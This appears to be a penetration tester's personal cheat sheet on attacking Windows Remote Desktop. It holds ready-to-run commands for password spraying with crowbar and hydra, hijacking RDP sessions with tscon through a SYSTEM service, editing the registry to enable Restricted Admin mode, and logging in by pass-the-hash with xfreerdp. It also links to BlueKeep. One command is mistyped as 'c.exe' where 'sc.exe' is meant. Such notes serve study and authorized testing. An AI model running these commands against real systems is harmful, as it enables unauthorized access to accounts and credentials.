# #Misconfigurations 

### Password guessing 
#### Using [crowbar](https://github.com/galkan/crowbar)
```shell-session
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```
#### #Hydra 
```shell-session
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
```

## Session Hijacking 

Need to have #SYSTEM privilege and used [tscon.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon)

```cmd
 tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

Local #admin privileges 
```cmd
query user
```

```cmd
c.exe create sessionhijack binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#0"
```

```cmd
net start sessionhijack
```

## RDP Pass-the-Hash (PtH)

Caveats 
- `Restricted Admin Mode`, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```shell
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

## Latest Vulns
[Blue Keep CVE-2019-0708](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
